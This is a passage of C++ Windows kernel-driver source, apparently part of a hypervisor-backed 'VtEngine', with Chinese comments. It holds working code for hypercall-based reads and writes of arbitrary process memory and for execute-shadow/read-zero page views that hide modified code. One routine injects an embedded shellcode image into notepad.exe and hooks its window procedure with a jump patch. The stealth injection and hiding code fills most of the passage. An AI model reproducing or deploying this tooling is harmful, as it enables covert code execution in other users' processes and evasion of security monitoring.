                                     _In_ ULONG MinimumSize, _In_ ULONG MaximumSize,
                                     _Out_ PULONG PatchSize)
{
    if (!Cr3 || !HookVa || !PatchSize || MinimumSize < 12 || MaximumSize > 64 || MinimumSize > MaximumSize)
        return FALSE;

    UCHAR code[64] = {};
    if (VtEngine::ReadVirtualMemory(Cr3, HookVa, code, sizeof(code)) != sizeof(code))
    {
        DBG("[-] Notepad NPT test: hook bytes read failed hook=0x%llX", HookVa);
        return FALSE;
    }

    ULONG total = 0;
    while (total < MinimumSize)
    {
        hde64s decoded = {};
        const unsigned int length = hde64_disasm(code + total, &decoded);
        if (!length || length > 15 || (decoded.flags & F_ERROR) || total + length > MaximumSize)
        {
            DBG("[-] Notepad NPT test: hook instruction decode failed hook=0x%llX offset=%lu length=%u flags=0x%X",
                HookVa, total, length, decoded.flags);
            return FALSE;
        }
        if (decoded.flags & F_RELATIVE)
        {
            DBG("[-] Notepad NPT test: RIP/relative instruction is unsupported in stolen-byte span hook=0x%llX offset=%lu length=%u flags=0x%X",
                HookVa, total, length, decoded.flags);
            return FALSE;
        }
        total += length;
    }

    if (total > PAGE_SIZE - (ULONG)(HookVa & (PAGE_SIZE - 1)))
    {
        DBG("[-] Notepad NPT test: hook patch crosses page hook=0x%llX size=%lu", HookVa, total);
        return FALSE;
    }
    *PatchSize = total;
    DBG("[+] Notepad NPT test: hook instruction span decoded hook=0x%llX size=%lu", HookVa, total);
    return TRUE;
}

static BOOLEAN VtEmbeddedInstallViews(_In_ PEPROCESS Process, _In_ ULONG64 TextBase)
{
    if (!Process || !VtEngine::IsActive())
    {
        DBG("[-] Notepad NPT test: shellcode view prerequisites failed process=%p active=%d",
            Process, VtEngine::IsActive());
        return FALSE;
    }

#if !VT_DEBUG_NOTEPAD_SHELLCODE_DUAL_VIEW
    UNREFERENCED_PARAMETER(TextBase);
    DBG("[*] Notepad NPT test: shellcode dual-view disabled; using original .text pages");
    return TRUE;
#else
    VT_EMBEDDED_SECTION text = {};
    if (!VtEmbeddedGetSection(".text", &text) || !text.VirtualSize || !text.RawSize)
    {
        DBG("[-] Notepad NPT test: .text view metadata missing");
        return FALSE;
    }

    const ULONG64 first = TextBase & ~(ULONG64)(PAGE_SIZE - 1);
    const ULONG64 textSpan = (text.RawSize > text.VirtualSize) ? text.RawSize : text.VirtualSize;
    const ULONG64 end = TextBase + textSpan;
    DBG("[*] Notepad NPT test: install view .text only first=0x%llX end=0x%llX pages=%llu",
        first, end, (end > first) ? ((end - first + PAGE_SIZE - 1) / PAGE_SIZE) : 0);
    for (ULONG64 page = first; page < end; page += PAGE_SIZE)
    {
        if (s_NotepadShellcodeViewPageCount >= RTL_NUMBER_OF(s_NotepadShellcodeViewPages) ||
            !VtEngine::EhInstall((ULONG64)(ULONG_PTR)Process, page, FALSE, VT_EH_VIEW_EXEC_SHADOW_READ_ZERO))
        {
            DBG("[-] Notepad NPT test: .text view install failed page=0x%llX count=%lu",
                page, s_NotepadShellcodeViewPageCount);
            return FALSE;
        }
        s_NotepadShellcodeViewPages[s_NotepadShellcodeViewPageCount++] = page;
    }
    DBG("[+] Notepad NPT test: shellcode .text-only views installed pages=%lu", s_NotepadShellcodeViewPageCount);
    return s_NotepadShellcodeViewPageCount != 0;
#endif
}

static VOID VtEmbeddedRemoveViews(_In_ PEPROCESS Process)
{
#if !VT_DEBUG_NOTEPAD_SHELLCODE_DUAL_VIEW
    UNREFERENCED_PARAMETER(Process);
    DBG("[*] Notepad NPT test: shellcode dual-view already disabled; no views removed");
    s_NotepadShellcodeViewPageCount = 0;
    RtlZeroMemory(s_NotepadShellcodeViewPages, sizeof(s_NotepadShellcodeViewPages));
    return;
#else
    if (!Process)
        return;
    DBG("[*] Notepad NPT test: removing shellcode views process=%p pages=%lu", Process,
        s_NotepadShellcodeViewPageCount);
    while (s_NotepadShellcodeViewPageCount)
    {
        const ULONG64 page = s_NotepadShellcodeViewPages[--s_NotepadShellcodeViewPageCount];
        if (VtEngine::IsActive())
        {
            const BOOLEAN removed = VtEngine::EhRemove((ULONG64)(ULONG_PTR)Process, page);
            DBG("[*] Notepad NPT test: view removed page=0x%llX result=%d", page, removed);
        }
        s_NotepadShellcodeViewPages[s_NotepadShellcodeViewPageCount] = 0;
    }
#endif
}
#endif

// 放置于 .text 可执行节区的原生 VMCALL (Intel VT-x) 与 VMMCALL (AMD SVM) Stub
// 严格遵循 VT_Drvier 64 位寄存器 ABI：
//   rax = (VT_HYPERCALL_KEY << 8) | (Code & 0xFF)
//   rcx = Args[0], rdx = Args[1], r8 = Args[2], r9 = Args[3], r10 = Args[4], r11 = Args[5]
// 仅使用 Win64 volatile 寄存器，保持 leaf-function 形态；这样即使 VMCALL/VMMCALL
// 触发异常，x64 unwinder 也不需要额外的 .pdata/.xdata 描述。
#pragma code_seg(".text")
__declspec(allocate(".text")) __declspec(align(16)) static const UCHAR s_VmCallStub[] = {
    0x48, 0x8B, 0x01,       // mov rax, [rcx+0x00] (Flags)
    0x48, 0x8B, 0x51, 0x10, // mov rdx, [rcx+0x10] (Args[1])
    0x4C, 0x8B, 0x41, 0x18, // mov r8,  [rcx+0x18] (Args[2])
    0x4C, 0x8B, 0x49, 0x20, // mov r9,  [rcx+0x20] (Args[3])
    0x4C, 0x8B, 0x51, 0x28, // mov r10, [rcx+0x28] (Args[4])
    0x4C, 0x8B, 0x59, 0x30, // mov r11, [rcx+0x30] (Args[5])
    0x48, 0x8B, 0x49, 0x08, // mov rcx, [rcx+0x08] (Args[0])
    0x0F, 0x01, 0xC1,       // vmcall (Intel VT-x)
    0xC3                    // ret
};

__declspec(allocate(".text")) __declspec(align(16)) static const UCHAR s_SvmCallStub[] = {
    0x48, 0x8B, 0x01,       // mov rax, [rcx+0x00] (Flags)
    0x48, 0x8B, 0x51, 0x10, // mov rdx, [rcx+0x10] (Args[1])
    0x4C, 0x8B, 0x41, 0x18, // mov r8,  [rcx+0x18] (Args[2])
    0x4C, 0x8B, 0x49, 0x20, // mov r9,  [rcx+0x20] (Args[3])
    0x4C, 0x8B, 0x51, 0x28, // mov r10, [rcx+0x28] (Args[4])
    0x4C, 0x8B, 0x59, 0x30, // mov r11, [rcx+0x30] (Args[5])
    0x48, 0x8B, 0x49, 0x08, // mov rcx, [rcx+0x08] (Args[0])
    0x0F, 0x01, 0xD9,       // vmmcall (AMD SVM)
    0xC3                    // ret
};
#pragma code_seg()

static volatile LONG s_CpuVendorState = 0; // 0=Unknown, 1=Intel, 2=AMD

static BOOLEAN VtIsAmdCpu(VOID)
{
    LONG state = InterlockedCompareExchange(&s_CpuVendorState, 0, 0);
    if (state != 0)
    {
        return (state == 2) ? TRUE : FALSE;
    }
    int regs[4] = {0};
    __cpuid(regs, 0);
    // AuthenticAMD: EBX='Auth'(0x68747541), EDX='enti'(0x69746E65), ECX='cAMD'(0x444D4163)
    const BOOLEAN bAmd = (regs[1] == 0x68747541 && regs[3] == 0x69746E65 && regs[2] == 0x444D4163) ? TRUE : FALSE;
    InterlockedExchange(&s_CpuVendorState, bAmd ? 2 : 1);
    return bAmd;
}

typedef ULONG64(__fastcall *FN_VMCALL_STUB)(const VT_HYPERCALL_INPUT *pInput);

NO_OBFUS ULONG64 VtEngine::RawHypercall(_In_ VT_HYPERCALL_CODE Code, _In_ ULONG64 Arg0, _In_ ULONG64 Arg1,
                                        _In_ ULONG64 Arg2, _In_ ULONG64 Arg3, _In_ ULONG64 Arg4, _In_ ULONG64 Arg5)
{
    VT_HYPERCALL_INPUT input;
    input.Flags = (VT_HYPERCALL_KEY << 8) | ((ULONG64)Code & 0xFFULL);
    input.Args[0] = Arg0;
    input.Args[1] = Arg1;
    input.Args[2] = Arg2;
    input.Args[3] = Arg3;
    input.Args[4] = Arg4;
    input.Args[5] = Arg5;

    ULONG64 result = 0;
    __try
    {
        const BOOLEAN bAmd = VtIsAmdCpu();
        if (!bAmd && (__readcr4() & (1ULL << 13)) == 0)
        {
            return 0;
        }
        const FN_VMCALL_STUB fnVmCall = (FN_VMCALL_STUB)(const void *)(bAmd ? s_SvmCallStub : s_VmCallStub);
        result = fnVmCall(&input);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        result = 0;
    }
    return result;
}

BOOLEAN VtEngine::IsActive(VOID)
{
    return (InterlockedCompareExchange(&s_bVtActive, 0, 0) != 0) ? TRUE : FALSE;
}

BOOLEAN VtEngine::IsPayloadResident(VOID)
{
    return (InterlockedCompareExchange(&s_bPayloadResident, 0, 0) != 0) ? TRUE : FALSE;
}

BOOLEAN VtEngine::PingHv(VOID)
{
    return (RawHypercall(VT_HC_PING) == VT_HYPERVISOR_SIGNATURE) ? TRUE : FALSE;
}

BOOLEAN VtEngine::PingPayload(_In_ ULONG64 Nonce, _Out_opt_ PULONG64 OutPong)
{
    const ULONG64 pong = RawHypercall(VT_HC_PAYLOAD_PING, Nonce);
    if (OutPong)
    {
        *OutPong = pong;
    }
    return (pong == (PAYLOAD_PONG_MAGIC ^ Nonce)) ? TRUE : FALSE;
}

BOOLEAN VtEngine::GetPayloadStatus(_Out_ payload_status *OutStatus)
{
    if (!OutStatus)
    {
        return FALSE;
    }
    RtlZeroMemory(OutStatus, sizeof(*OutStatus));
    const ULONG64 rc = RawHypercall(VT_HC_GET_PAYLOAD_STATUS, (ULONG64)OutStatus, sizeof(*OutStatus));
    return (rc == PAYLOAD_RESULT_OK && OutStatus->magic == PAYLOAD_STATUS_MAGIC) ? TRUE : FALSE;
}

BOOLEAN VtEngine::GetResidentHvDiag(_Out_ mapctl_hv_diag *OutDiag)
{
    if (!OutDiag)
    {
        return FALSE;
    }
    RtlZeroMemory(OutDiag, sizeof(*OutDiag));
    const ULONG64 copied = RawHypercall(VT_HC_GET_RESIDENT_HV_DIAG, (ULONG64)OutDiag, sizeof(*OutDiag));
    return (copied >= (MAPCTL_HV_DIAG_BASE_U64_COUNT * sizeof(ULONG64)) && OutDiag->magic == MAPCTL_HV_DIAG_MAGIC)
               ? TRUE
               : FALSE;
}

BOOLEAN VtEngine::SetPayloadMode(_In_ ULONG64 Kind, _In_ ULONG64 Mode)
{
    const ULONG64 rc = RawHypercall(VT_HC_SET_PAYLOAD_MODE, Kind, Mode);
    return (rc == PAYLOAD_RESULT_OK) ? TRUE : FALSE;
}

BOOLEAN VtEngine::Initialize(_In_opt_ PMACHENIKE_KERNEL_INTERFACE UserVar, _In_ ULONG BootFlags)
{
    UNREFERENCED_PARAMETER(UserVar);
    InterlockedExchange(&s_bVtActive, 0);
    InterlockedExchange(&s_bPayloadResident, 0);

    if ((BootFlags & DRV_BOOT_FLAG_ENABLE_VT) == 0)
    {
        DBG("[*] VtEngine::Initialize: disabled by boot flags");
        return FALSE;
    }

    const BOOLEAN bHvOk = PingHv();
    ULONG64 pong = 0;
    const ULONG64 kProbeNonce = 0x1337C0DE55AA1234ULL;
    const BOOLEAN bPayloadOk = PingPayload(kProbeNonce, &pong);

    if (!bHvOk && !bPayloadOk)
    {
        DBG("[*] VtEngine::Initialize: VT hypervisor not detected on current CPU, falling back to native System PTE engine.");
        return FALSE;
    }

    InterlockedExchange(&s_bVtActive, 1);
    if (bPayloadOk)
    {
        InterlockedExchange(&s_bPayloadResident, 1);
    }

    DBG("[+] VtEngine::Initialize: VT Hypervisor active (Arch=%s, HvPing=%d, ResidentPayload=%d, Pong=0x%016llX)",
        VtIsAmdCpu() ? "AMD-SVM" : "Intel-VMX", bHvOk, bPayloadOk, pong);
    return TRUE;
}

VOID VtEngine::Cleanup(_In_opt_ PMACHENIKE_KERNEL_INTERFACE UserVar)
{
    UNREFERENCED_PARAMETER(UserVar);
    CleanupNotepadNptTest();
    if (s_HookToShellcodeProcess)
        RemoveHookToShellcode(s_HookToShellcodeProcess, s_HookToShellcodeHookVa);
    if (s_ShellcodeDualViewProcess)
        RemoveShellcodeDualView(s_ShellcodeDualViewProcess, s_ShellcodeDualViewShellcodeEntryVa);
    if (!IsActive())
    {
        return;
    }

    InterlockedExchange(&s_bPayloadResident, 0);
    InterlockedExchange(&s_bVtActive, 0);
    DBG("[+] VtEngine::Cleanup: detached VT state.");
}

ULONG64 VtEngine::GetPhysicalAddress(_In_ ULONG64 Cr3, _In_ ULONG64 Va)
{
    if (!IsActive() || !Va)
    {
        return 0;
    }
    return RawHypercall(VT_HC_GET_PHYSICAL_ADDRESS, Cr3, Va);
}

ULONG64 VtEngine::QueryProcessCr3(_In_ ULONG64 TargetPid)
{
    if (!IsActive() || !TargetPid)
    {
        return 0;
    }
    return RawHypercall(VT_HC_QUERY_PROCESS_CR3, TargetPid);
}

ULONG64 VtEngine::ReadPhysicalMemory(_In_ ULONG64 PhysAddr, _Out_writes_bytes_(Size) PVOID Buffer, _In_ ULONG Size)
{
    if (!IsActive() || !PhysAddr || !Buffer || !Size)
    {
        return 0;
    }
    return RawHypercall(VT_HC_READ_PHYS_MEM, PhysAddr, (ULONG64)Buffer, (ULONG64)Size);
}

ULONG64 VtEngine::WritePhysicalMemory(_In_ ULONG64 PhysAddr, _In_reads_bytes_(Size) const VOID *Buffer, _In_ ULONG Size)
{
    if (!IsActive() || !PhysAddr || !Buffer || !Size)
    {
        return 0;
    }
    return RawHypercall(VT_HC_WRITE_PHYS_MEM, PhysAddr, (ULONG64)Buffer, (ULONG64)Size);
}

ULONG64 VtEngine::ReadVirtualMemory(_In_ ULONG64 Cr3, _In_ ULONG64 Va, _Out_writes_bytes_(Size) PVOID Buffer,
                                    _In_ ULONG Size)
{
    if (!IsActive() || !Cr3 || !Va || !Buffer || !Size)
    {
        return 0;
    }
    return RawHypercall(VT_HC_READ_VIRT_MEM, Cr3, (ULONG64)Buffer, Va, (ULONG64)Size);
}

ULONG64 VtEngine::WriteVirtualMemory(_In_ ULONG64 Cr3, _In_ ULONG64 Va, _In_reads_bytes_(Size) const VOID *Buffer,
                                     _In_ ULONG Size)
{
    if (!IsActive() || !Cr3 || !Va || !Buffer || !Size)
    {
        return 0;
    }
    return RawHypercall(VT_HC_WRITE_VIRT_MEM, Cr3, Va, (ULONG64)Buffer, (ULONG64)Size);
}

BOOLEAN VtEngine::EhInstall(_In_ ULONG64 Process, _In_ ULONG64 Va, _In_ BOOLEAN FullZero, _In_ ULONG ViewMode)
{
    if (!IsActive() || !Va)
    {
        return FALSE;
    }
    if (ViewMode > VT_EH_VIEW_EXEC_SHADOW_READ_ZERO)
    {
        return FALSE;
    }
    const ULONG64 flags = (FullZero ? 1ULL : 0ULL) |
                          (ViewMode == VT_EH_VIEW_EXEC_ORIGINAL_READ_SHADOW ? 2ULL : 0ULL) |
                          (ViewMode == VT_EH_VIEW_EXEC_SHADOW_READ_ZERO ? 4ULL : 0ULL);
    return (RawHypercall(VT_HC_EH_INSTALL, Process, Va, flags) != 0) ? TRUE : FALSE;
}

BOOLEAN VtEngine::EhRemove(_In_ ULONG64 Process, _In_ ULONG64 Va)
{
    if (!IsActive() || !Va)
    {
        return FALSE;
    }
    return (RawHypercall(VT_HC_EH_REMOVE, Process, Va) != 0) ? TRUE : FALSE;
}

BOOLEAN VtEngine::EhEnable(_In_ ULONG64 Process, _In_ ULONG64 Va)
{
    if (!IsActive() || !Va)
    {
        return FALSE;
    }
    return (RawHypercall(VT_HC_EH_ENABLE, Process, Va) != 0) ? TRUE : FALSE;
}

BOOLEAN VtEngine::EhDisable(_In_ ULONG64 Process, _In_ ULONG64 Va)
{
    if (!IsActive() || !Va)
    {
        return FALSE;
    }
    return (RawHypercall(VT_HC_EH_DISABLE, Process, Va) != 0) ? TRUE : FALSE;
}

BOOLEAN VtEngine::EhWrite(_In_ ULONG64 Process, _In_ ULONG64 Va, _In_ const VOID *Buffer, _In_ ULONG64 Size)
{
    if (!IsActive() || !Va || !Buffer || !Size)
    {
        return FALSE;
    }
    return (RawHypercall(VT_HC_EH_WRITE, Process, Va, (ULONG64)Buffer, Size) != 0) ? TRUE : FALSE;
}

ULONG64 VtEngine::EhGetFakeVa(_In_ ULONG64 Process, _In_ ULONG64 Va)
{
    if (!IsActive() || !Va)
    {
        return 0;
    }
    return RawHypercall(VT_HC_EH_GET_VA, Process, Va);
}

BOOLEAN VtEngine::EhRemoveAllByProcess(_In_ ULONG64 Process)
{
    if (!IsActive() || !Process)
    {
        return FALSE;
    }
    return (RawHypercall(VT_HC_EH_REMOVE_ALL_BY_PROCESS, Process) != 0) ? TRUE : FALSE;
}

BOOLEAN VtEngine::InstallShellcodeDualView(_In_ ULONG64 Process,
                                           _In_ ULONG64 ShellcodeEntryVa)
{
    if (!IsActive() || !Process || !ShellcodeEntryVa)
    {
        return FALSE;
    }

    if (s_ShellcodeDualViewProcess)
    {
        return s_ShellcodeDualViewProcess == Process &&
               s_ShellcodeDualViewShellcodeEntryVa == ShellcodeEntryVa;
    }

    if (!EhInstall(Process, ShellcodeEntryVa, FALSE, VT_EH_VIEW_EXEC_SHADOW_READ_ZERO))
    {
        return FALSE;
    }
    s_ShellcodeDualViewProcess = Process;
    s_ShellcodeDualViewShellcodeEntryVa = ShellcodeEntryVa;
    DBG("[+] Shellcode dual view installed: process=0x%llX shellcode=0x%llX mode=exec-shadow/read-zero",
        Process, ShellcodeEntryVa);
    return TRUE;
}

BOOLEAN VtEngine::InstallHookToShellcode(_In_ ULONG64 Process,
                                         _In_ ULONG64 HookVa,
                                         _In_ ULONG64 ShellcodeEntryVa,
                                         _In_reads_bytes_(HookPatchSize) const VOID *HookPatch,
                                         _In_ ULONG HookPatchSize)
{
    if (!IsActive() || !Process || !HookVa || !ShellcodeEntryVa ||
        !HookPatch || !HookPatchSize || HookPatchSize > 64 ||
        HookPatchSize > PAGE_SIZE - (ULONG)(HookVa & (PAGE_SIZE - 1)) ||
        s_ShellcodeDualViewProcess != Process ||
        s_ShellcodeDualViewShellcodeEntryVa != ShellcodeEntryVa)
    {
        return FALSE;
    }

    UCHAR patch[64] = {};
    __try
    {
        RtlCopyMemory(patch, HookPatch, HookPatchSize);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return FALSE;
    }

    if (s_HookToShellcodeProcess)
    {
        return s_HookToShellcodeProcess == Process &&
               s_HookToShellcodeHookVa == HookVa &&
               s_HookToShellcodeShellcodeEntryVa == ShellcodeEntryVa;
    }

#if VT_DEBUG_NOTEPAD_HOOK_DUAL_VIEW
    const BOOLEAN same_page =
        (HookVa & ~(ULONG64)(PAGE_SIZE - 1)) == (ShellcodeEntryVa & ~(ULONG64)(PAGE_SIZE - 1));
    if (!same_page && !EhInstall(Process, HookVa, FALSE, VT_EH_VIEW_EXEC_SHADOW_READ_ZERO))
    {
        DBG("[-] Hook-to-shellcode: hook dual-view install failed process=0x%llX hook=0x%llX",
            Process, HookVa);
        return FALSE;
    }

    if (!EhWrite(Process, HookVa, patch, HookPatchSize))
    {
        if (!same_page)
            EhRemove(Process, HookVa);
        DBG("[-] Hook-to-shellcode: shadow patch write failed hook=0x%llX size=%lu", HookVa, HookPatchSize);
        return FALSE;
    }
    DBG("[+] Hook-to-shellcode: hook dual-view active mode=exec-shadow/read-zero hook=0x%llX",
        HookVa);
#else
    const BOOLEAN privateWrite = VtWriteProcessPrivate((PEPROCESS)Process, HookVa, patch, HookPatchSize);
    if (!privateWrite)
    {
        DBG("[-] Hook-to-shellcode: process-private patch failed process=0x%llX hook=0x%llX size=%lu",
            Process, HookVa, HookPatchSize);
        return FALSE;
    }
    UCHAR readback[64] = {};
    const BOOLEAN privateRead = VtReadProcessPrivate(
        (PEPROCESS)Process, HookVa, readback, HookPatchSize);
    const SIZE_T matched = privateRead
        ? RtlCompareMemory(readback, patch, HookPatchSize)
        : 0;
    DBG("[*] Hook-to-shellcode: process-view hook readback process=0x%llX hook=0x%llX read=%d matched=%llu/%lu",
        Process, HookVa, privateRead, (ULONG64)matched, HookPatchSize);
    if (!privateRead || matched != HookPatchSize)
    {
        DBG("[-] Hook-to-shellcode: process-view hook readback mismatch");
        return FALSE;
    }
    DBG("[+] Hook-to-shellcode: hook dual-view disabled; process-private COW patch installed hook=0x%llX",
        HookVa);
#endif

    s_HookToShellcodeProcess = Process;
    s_HookToShellcodeHookVa = HookVa;
    s_HookToShellcodeShellcodeEntryVa = ShellcodeEntryVa;
    DBG("[+] Hook-to-shellcode installed: process=0x%llX hook=0x%llX shellcode=0x%llX",
        Process, HookVa, ShellcodeEntryVa);
    return TRUE;
}

BOOLEAN VtEngine::InstallHookToShellcodeEntry(_In_ ULONG64 Process,
                                               _In_ ULONG64 HookVa,
                                               _In_ ULONG64 ShellcodeEntryVa,
                                               _In_ ULONG HookPatchSize)
{
    if (HookPatchSize < 12 || HookPatchSize > 64)
        return FALSE;

    UCHAR patch[64] = {};
    RtlFillMemory(patch, HookPatchSize, 0x90);
    patch[0] = 0x48;
    patch[1] = 0xB8;
    RtlCopyMemory(patch + 2, &ShellcodeEntryVa, sizeof(ShellcodeEntryVa));
    patch[10] = 0xFF;
    patch[11] = 0xE0;
    return InstallHookToShellcode(Process, HookVa, ShellcodeEntryVa, patch, HookPatchSize);
}

BOOLEAN VtEngine::RemoveHookToShellcode(_In_ ULONG64 Process,
                                        _In_ ULONG64 HookVa)
{
    if (!Process || !HookVa || s_HookToShellcodeProcess != Process ||
        s_HookToShellcodeHookVa != HookVa)
        return FALSE;

    BOOLEAN ok = TRUE;
#if VT_DEBUG_NOTEPAD_HOOK_DUAL_VIEW
    const ULONG64 shellcodeVa = s_HookToShellcodeShellcodeEntryVa;
    const BOOLEAN same_page =
        (HookVa & ~(ULONG64)(PAGE_SIZE - 1)) == (shellcodeVa & ~(ULONG64)(PAGE_SIZE - 1));
    if (IsActive() && !same_page)
    {
        ok = EhRemove(Process, HookVa) && ok;
    }
#endif
    s_HookToShellcodeProcess = 0;
    s_HookToShellcodeHookVa = 0;
    s_HookToShellcodeShellcodeEntryVa = 0;
    DBG("[*] Hook-to-shellcode removed: process=0x%llX hook=0x%llX ok=%d",
        Process, HookVa, ok);
    return ok;
}

BOOLEAN VtEngine::RemoveShellcodeDualView(_In_ ULONG64 Process,
                                          _In_ ULONG64 ShellcodeEntryVa)
{
    if (!Process || !ShellcodeEntryVa || s_ShellcodeDualViewProcess != Process ||
        s_ShellcodeDualViewShellcodeEntryVa != ShellcodeEntryVa)
        return FALSE;

    if (s_HookToShellcodeProcess == Process &&
        s_HookToShellcodeShellcodeEntryVa == ShellcodeEntryVa)
    {
        return FALSE;
    }

    BOOLEAN ok = !IsActive() || EhRemove(Process, ShellcodeEntryVa);
    s_ShellcodeDualViewProcess = 0;
    s_ShellcodeDualViewShellcodeEntryVa = 0;
    DBG("[*] Shellcode dual view removed: process=0x%llX shellcode=0x%llX ok=%d",
        Process, ShellcodeEntryVa, ok);
    return ok;
}

BOOLEAN VtEngine::InstallShellcodeDualView(_In_ ULONG64 Process,
                                           _In_ ULONG64 HookVa,
                                           _In_ ULONG64 ShellcodeEntryVa,
                                           _In_reads_bytes_(HookPatchSize) const VOID *HookPatch,
                                           _In_ ULONG HookPatchSize)
{
    const BOOLEAN already_installed =
        s_ShellcodeDualViewProcess == Process && s_ShellcodeDualViewShellcodeEntryVa == ShellcodeEntryVa;
    if (!already_installed && !InstallShellcodeDualView(Process, ShellcodeEntryVa))
        return FALSE;
    if (InstallHookToShellcode(Process, HookVa, ShellcodeEntryVa, HookPatch, HookPatchSize))
        return TRUE;
    if (!already_installed)
        RemoveShellcodeDualView(Process, ShellcodeEntryVa);
    return FALSE;
}

BOOLEAN VtEngine::RemoveShellcodeDualView(_In_ ULONG64 Process,
                                          _In_ ULONG64 HookVa,
                                          _In_ ULONG64 ShellcodeEntryVa)
{
    BOOLEAN ok = RemoveHookToShellcode(Process, HookVa);
    if (s_ShellcodeDualViewProcess == Process && s_ShellcodeDualViewShellcodeEntryVa == ShellcodeEntryVa)
        ok = RemoveShellcodeDualView(Process, ShellcodeEntryVa) && ok;
    return ok;
}

BOOLEAN VtEngine::RunNotepadNptTest(_In_ PMACHENIKE_KERNEL_INTERFACE UserVar)
{
#if !(ENABLE_DEBUG_SHELLCODE_IMAGE && VT_DEBUG_NOTEPAD_NPT_TEST)
    UNREFERENCED_PARAMETER(UserVar);
    return FALSE;
#else
    DBG("[*] Notepad NPT test: begin");
    if (InterlockedCompareExchange(&s_NotepadNptState, 1, 0) != 0)
    {
        const LONG state = InterlockedCompareExchange(&s_NotepadNptState, 0, 0);
        DBG("[*] Notepad NPT test: setup already active (state=%ld)", state);
        return state == 2;
    }

    if (!UserVar || !UserVar->Func.PsGetProcessImageFileName ||
        !UserVar->Func.PsGetProcessId || !UserVar->Func.PsLookupProcessByProcessId ||
        !UserVar->Func.PsGetProcessSectionBaseAddress ||
        !UserVar->Func.ObfDereferenceObject || !IsActive())
    {
        DBG("[-] Notepad NPT test: required process or VT primitives are unavailable");
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }

    PEPROCESS process = NULL;
    for (ULONG_PTR pid = 4; pid < 0x20000; pid += 4)
    {
        PEPROCESS pTemp = NULL;
        if (NT_SUCCESS(UserVar->Func.PsLookupProcessByProcessId((HANDLE)pid, &pTemp)) && pTemp)
        {
            if (VtIsNotepadImageName(UserVar->Func.PsGetProcessImageFileName(pTemp)))
            {
                process = pTemp;
                break;
            }
            UserVar->Func.ObfDereferenceObject(pTemp);
        }
    }
    if (!process)
    {
        DBG("[-] Notepad NPT test: notepad.exe is not running");
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }

    const ULONG64 pid = (ULONG64)(ULONG_PTR)UserVar->Func.PsGetProcessId(process);
    const ULONG64 imageBase = (ULONG64)(ULONG_PTR)UserVar->Func.PsGetProcessSectionBaseAddress(process);
    const ULONG64 cr3 = QueryProcessCr3(pid);
    ULONG64 hookVa = 0;
    ULONG64 codeBase = 0;
    ULONG64 dataBase = 0;
    VT_EMBEDDED_SECTION textSection = {};
    SIZE_T codeSize = 0;
    SIZE_T dataSize = PAGE_SIZE;
    if (!VtEmbeddedGetSection(".text", &textSection) || !textSection.VirtualSize || !textSection.RawSize)
    {
        DBG("[-] Notepad NPT test: embedded .text metadata invalid");
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }
    const ULONG textSpan = (textSection.RawSize > textSection.VirtualSize) ? textSection.RawSize : textSection.VirtualSize;
    codeSize = ((SIZE_T)textSpan + PAGE_SIZE - 1) & ~(SIZE_T)(PAGE_SIZE - 1);
    ULONG hookPatchSize = 0;
    UCHAR originalHook[64] = {};
    BOOLEAN viewsInstalled = FALSE;
    BOOLEAN ghostInstalled = FALSE;
    ULONG64 ghostRetVa = 0;

    DBG("[*] Notepad NPT test: target pid=%llu image=0x%llX cr3=0x%llX", pid, imageBase, cr3);

    if (!pid || !imageBase || !cr3 || !VtResolveNotepadWndProc(process, cr3, imageBase, &hookVa) ||
        !VtDecodeHookPatchSize(cr3, hookVa, 12, sizeof(originalHook), &hookPatchSize) ||
        VtEngine::ReadVirtualMemory(cr3, hookVa, originalHook, hookPatchSize) != hookPatchSize ||
        !VtEmbeddedAllocate(process, codeSize, PAGE_EXECUTE_READWRITE, &codeBase) ||
        !VtEmbeddedAllocate(process, dataSize, PAGE_READWRITE, &dataBase))
    {
        DBG("[-] Notepad NPT test: unable to prepare target (pid=%llu base=0x%llX cr3=0x%llX hook=0x%llX patch=%lu code=0x%llX data=0x%llX)",
            pid, imageBase, cr3, hookVa, hookPatchSize, codeBase, dataBase);
        if (dataBase)
            VtEmbeddedFree(process, &dataBase, &dataSize);
        if (codeBase)
            VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }

    DBG("[+] Notepad NPT test: target prepared hook=0x%llX patch=%lu text_base=0x%llX text_size=0x%llX data=0x%llX/0x%llX",
        hookVa, hookPatchSize, codeBase, (ULONG64)codeSize, dataBase, (ULONG64)dataSize);

    if (g_DebugShellcodeImageEntryRva < textSection.Rva ||
        g_DebugShellcodeRuntimeDispatchRva < textSection.Rva ||
        g_DebugShellcodeImageEntryRva - textSection.Rva >= textSpan ||
        g_DebugShellcodeRuntimeDispatchRva - textSection.Rva >= textSpan)
    {
        DBG("[-] Notepad NPT test: shellcode entry/dispatch is outside .text entry_rva=0x%lX dispatch_rva=0x%lX text_rva=0x%lX text_size=0x%lX",
            g_DebugShellcodeImageEntryRva, g_DebugShellcodeRuntimeDispatchRva,
            textSection.Rva, textSpan);
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }

    const ULONG64 shellcodeEntryVa = codeBase + (g_DebugShellcodeImageEntryRva - textSection.Rva);
    const ULONG64 runtimeDispatchVa = codeBase + (g_DebugShellcodeRuntimeDispatchRva - textSection.Rva);
    const ULONG64 resumeVa = hookVa + hookPatchSize;
    if (resumeVa < hookVa ||
        !VtEmbeddedCopyText(process, codeBase) ||
        !VtEmbeddedPatchRuntime(process, codeBase, dataBase,
                                runtimeDispatchVa, resumeVa,
                                originalHook, hookPatchSize))
    {
        DBG("[-] Notepad NPT test: embedded shellcode copy/patch failed (pid=%llu)", pid);
        VtEmbeddedFree(process, &dataBase, &dataSize);
        VtEmbeddedFree(process, &codeBase, &codeSize);
        UserVar->Func.ObfDereferenceObject(process);
        InterlockedExchange(&s_NotepadNptState, 0);
        return FALSE;
    }

    DBG("[+] Notepad NPT test: .text copied and runtime patched text_base=0x%llX entry=0x%llX dispatch=0x%llX resume=0x%llX",
        codeBase, shellcodeEntryVa, runtimeDispatchVa, resumeVa);

